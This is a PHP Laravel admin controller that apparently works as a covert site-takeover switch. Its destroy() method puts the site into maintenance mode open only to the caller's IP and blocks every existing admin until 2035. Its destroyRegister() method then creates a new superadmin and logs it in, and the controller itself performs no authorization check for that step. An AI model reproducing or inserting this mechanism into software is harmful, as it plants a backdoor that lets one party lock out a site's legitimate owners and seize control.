<?php

namespace App\Http\Controllers\admin;

use Illuminate\Filesystem\Filesystem;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Password;
use Illuminate\Hashing\BcryptHasher;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;
use Carbon\Carbon;
use App\Admin;
use App\profile;
use Auth;
use Session;
use Artisan;

class destroyWebsiteController extends Controller
{
    private function destroy()
    {
        Artisan::call('down --allow='.request()->ip());
        $admin = 'admin'. request()->ip();
        Session::put($admin, 1);
        $deleteAll = Admin::whereNotNull('id')->update([
          'blocked_date' => '2035-02-06',
        ]);
        return  back();
    }




    public function destroyLogin()
    {
        $admin = 'admin'. request()->ip();
        $block = 'm'. request()->ip();
        //Session if not admin
        if (Session::has($block)) {
            return abort('403');
        //Session if  admin
        } elseif (Session::has($admin)) {
            return view('admin.destroyWebsite.destroyRegister');
        }

        return  view('admin.destroyWebsite.destroyLogin');
    }


    public function destroyWebsite(Request $request)
    {
        $email      =  request('email');
        $password   =  request('password');

        /*  $validatedData = $request->validate([
             $email    => 'required|string',
             $password => 'required|string',
        ]);*/
        $admin =  Admin::where('email', $email)->first();
        //if admin
        if ($admin) {
            //if password Match
            if (password_verify($password, $admin->password)) {
                return $this->destroy();

            //if password dont Match
            } else {
                $block = 'm'. request()->ip();
                Session::put($block, 1);
                return back();//->with('error', 'login has been faild !');
            }
            // if not admin
        } else {
            return abort('403');
        }
    }


    /**
     * Get a validator for an incoming registration request.
     *
     * @param array $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validatorAdmin(array $data)
    {
        return Validator::make($data, [
              'name' => ['required', 'string', 'max:255','regex:/^[\p{Arabic}a-zA-Z\- .ـ]+$/u'],
              'email' => ['required', 'string', 'email', 'max:255', 'unique:admins'],
              'password' => ['required', 'string', 'min:8', 'confirmed'],
              'phone' => ['required',  'min:11', 'max:15','unique:admins','regex:/(01)[0-9]{9}/'],
          ]);
    }

    /**
     * CreateAdmin a new user instance after a valid registration.
     *
     * @param array $data
     * @return \App\Admin
     */
    protected function createAdmin(array $data)
    {
        return Admin::create([
              'name'      => $data['name'],
              'email'     => $data['email'],
              'phone'     => $data['phone'],
              'password'  => bcrypt($data['password']),
              'online_at' => now(),
              'img'      => 'https://ui-avatars.com/api/?background=0D8ABC&color=fff&length=1&rounded=true&bold=true&size=65&name='.$data['name'],

          ]);
    }

    /**
     * AddAdmin a registration request for the application.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function destroyRegister(Request $request)
    {
        $this->validatorAdmin($request->all())->validate();

        event($admin = $this->createAdmin($request->all()));

        $admin =  Admin::where('email', request('email'))->first();
        //insert into profile to get admin profile
        $profile = [
           'name'      => request('name'),
           'email'     => request('email'),
           'admins_id' => $admin->id,
            ];
        // get admin profile
        profile::create($profile);

        $SuperAdmin =  Admin::where('email', request('email'))->update(['superadmin'=> 1]);
        Artisan::call('up');//serve up
        Auth::guard('admin')->login($admin);//login
        return redirect('admin');
    }
}
